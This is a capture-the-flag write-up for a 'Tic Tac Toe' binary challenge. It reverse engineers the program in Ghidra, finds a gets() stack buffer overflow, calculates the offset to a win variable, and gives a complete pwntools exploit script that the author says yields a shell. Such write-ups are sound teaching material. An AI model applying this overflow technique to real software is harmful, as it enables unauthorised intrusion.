# Tic Tac Toe
Created by: Sasha (@kyrili on Discord)  
Writeup by: Ethan Andrews (UofUsec)

## Description
I bet you can't beat me at tic tac toe.

## Writeup
### Initial Look
By running the program, it appears to be a tictactoe game between a CPU. 

![image](https://github.com/user-attachments/assets/d662e6d8-db36-44dc-81ee-0a312033d0b1)

### Information Gathering
We can analyze it using Ghidra (an open source decompiling tool for reverse engineering) to see where potential vulnerabilities are. Using Ghidra, we can analyze the c code and change variables names to deobfuscate and perform some reverse engineering.
The CPU choices appear to be hard coded rather than based on an algorithm.

![image](https://github.com/user-attachments/assets/f52997ab-ad25-4f58-ae2f-c8e01eaf9c21)

Now we will search for the win conditions. We find the following code that shows the conditions necessary to win.

![image](https://github.com/user-attachments/assets/7dd6ef31-66fb-4579-8d97-235dacdabede)

So it appears that in order to win, the player must tie, and then have a certain variable (renamed tie_or_win) set to a non-zero value. 

### Finding Vulnerabilities
We also find several vulnerabilities in the code. The code utilizes the gets() function to read in user input. This allows for buffer overflow whenever user input is being queried. We also note that 
it only considers the first character of the input as the move, so after the overflow occurs, it will still register it as a valid move.

![image](https://github.com/user-attachments/assets/108764f6-7911-413c-973c-dcd8a66ecd63)

We can also use Ghidra to determine where the variables are located. Luckily, the tie_or_win value is above the user input buffers allowing for buffer overflow directly into the variable.

![image](https://github.com/user-attachments/assets/58f112fa-8990-4565-92e8-c46d2f70c1a9)
![image](https://github.com/user-attachments/assets/276b3890-e858-401b-98d8-13ea335aa057)

### Solution
We can use pwntools to perform the exploit.
```python
from pwn import *

p = process("./tictactoe")

# Replace with remote server when exploit works
# p = remote("challenge.utctf.live...

```

Because we need to tie first, we will send the moves required to tie. We will leave the last move without a new line character
because we want to overflow on the last move.

```python
p.send(b"o\n")
p.send(b"5\n")
p.send(b"3\n")
p.send(b"4\n")
p.send(b"8")
```

Because we are overflowing on the last move, we need to overflow from the position of the user_move_4 buffer (stack - 0x55) to the 
tie_or_win value (stack - 0x10). This means we have to overflow it by `stack - 0x10 - (stack - 0x55) = 0x45` bytes or 69 in decimal. 
Because we already sent one byte (the character 8), we will additionally send another 68 bytes and then another character to 
make the tie_or_win variable non zero.

```python
p.send(b"\x90"*68 + b"\x01" + b"\n")
```

So that should be it right? Unfortunately, when I run the exploit, it doesn't accept the last move:

![image](https://github.com/user-attachments/assets/2dac56ff-b430-4465-a374-ca21ed5be5a3)

To figure out what's going on, we'll look at how the program registers what valid moves are. 

![image](https://github.com/user-attachments/assets/6954c8da-fb15-4160-a288-1b7a7354d515)

The key insight is that it checks whether the board state at that value is equal to zero. Unfortunately, the board state
is in between the user input buffer and the tie_or_win variable.

![image](https://github.com/user-attachments/assets/149ecdc3-5cc1-4e04-9d04-3fb2a675d6ee)

So when we overflow it with \x90 bytes, it changes all the values in the board state buffer to \x90 effectively removing all valid moves. Luckily, we can fix this by simply using \x00 for
padding instead of \x90. This gives us the final working exploit:

```python
from pwn import *

p = process("./tictactoe")

# Replace with remote server when exploit works
# p = remote("challenge.utctf.live...

p.send(b"o\n")
p.send(b"5\n")
p.send(b"3\n")
p.send(b"4\n")
p.send(b"8")
p.send(b"\x00"*68 + b"\x01" + b"\n")

p.interactive()
```

When run on the remote server, this grants access to a shell.

## Important Concepts
- Ghidra
- Buffer overflow
